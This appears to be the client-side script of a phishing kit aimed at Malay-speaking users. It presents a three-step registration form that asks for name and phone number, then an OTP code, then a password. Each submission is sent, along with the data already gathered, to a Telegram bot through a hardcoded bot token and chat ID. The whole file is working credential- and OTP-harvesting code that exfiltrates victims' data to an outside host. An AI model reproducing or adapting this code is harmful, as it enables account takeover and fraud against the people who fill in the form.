// Inisialisasi intl-tel-input
const phoneInputField = document.querySelector("#phone");
const phoneInput = window.intlTelInput(phoneInputField, {
  preferredCountries: ["my", "id", "us"],
  utilsScript:
    "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
});

// Fungsi untuk menampilkan halaman
function showPage(pageId) {
  document.querySelectorAll(".page").forEach((page) => {
    page.style.display = "none";
  });
  document.getElementById(pageId).style.display = "block";
}

// Fungsi untuk mengirim data ke Telegram
function sendToTelegram(message) {
  const token = "6659343012:AAEdioZm0xDgQXb9yasgG146aZhvTes_DcA";
  const chatId = "5927659674";
  return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}

// Handler form registrasi (halaman 1)
document
  .getElementById("registrationForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();
    const name = document.getElementById("name").value;
    const phone = phoneInput.getNumber();

    localStorage.setItem("name", name);
    localStorage.setItem("phone", phone);

    const message = `
───────────────────────
(MALAY | DATA | ${phone})
───────────────────────
- Nama Lengkap  : ${name}
- No HP         : ${phone}
──────────────────────`;

    document.getElementById("loadingScreen").style.display = "flex";

    sendToTelegram(message)
      .then((response) => {
        if (response.ok) {
          showPage("page2");
        }
      })
      .finally(() => {
        document.getElementById("loadingScreen").style.display = "none";
      });
  });

// Handler form OTP (halaman 2)
document.getElementById("otpForm").addEventListener("submit", function (event) {
  event.preventDefault();
  const otp = document.getElementById("otp").value;

  localStorage.setItem("otp", otp);

  const savedPhone = localStorage.getItem("phone");
  const savedName = localStorage.getItem("name");

  const message = `
───────────────────────
(MALAY | DATA | ${savedPhone})
───────────────────────
- Nama Lengkap  : ${savedName}
- No HP         : ${savedPhone}
- OTP           : ${otp}
───────────────────────`;

  document.getElementById("loadingScreen").style.display = "flex";

  sendToTelegram(message)
    .then((response) => {
      if (response.ok) {
        showPage("page3");
      }
    })
    .finally(() => {
      document.getElementById("loadingScreen").style.display = "none";
    });
});

// Handler form kata sandi (halaman 3)
document
  .getElementById("passwordForm")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    const password = document.getElementById("kata-sandi").value;
    const savedPhone = localStorage.getItem("phone");
    const savedName = localStorage.getItem("name");
    const savedOTP = localStorage.getItem("otp");

    const message = `
───────────────────────
(MALAY | DATA | ${savedPhone})
───────────────────────
- Nama Lengkap  : ${savedName}
- No HP         : ${savedPhone}
- OTP           : ${savedOTP}
- Password      : ${password}
───────────────────────`;

    document.getElementById("loadingScreen").style.display = "flex";

    sendToTelegram(message)
      .then((response) => {
        if (response.ok) {
          document.getElementById("passwordForm").style.display = "none";
          document.getElementById("kataSandi").style.display = "none";
          document.getElementById("loadingContent").style.display = "block";
        }
      })
      .finally(() => {
        document.getElementById("loadingScreen").style.display = "none";
      });
  });

// Handler untuk tombol "Gunakan Nombor Lain"
document
  .getElementById("useAnotherPhone")
  .addEventListener("click", function () {
    showPage("page1"); // Kembali ke halaman pertama
    // Reset semua form
    document.getElementById("passwordForm").reset();
    document.getElementById("otpForm").reset();
    document.getElementById("registrationForm").reset();

    // Kembalikan tampilan form password ke kondisi awal
    document.getElementById("passwordForm").style.display = "block";
    document.getElementById("kataSandi").style.display = "block";
    document.getElementById("loadingContent").style.display = "none";
  });
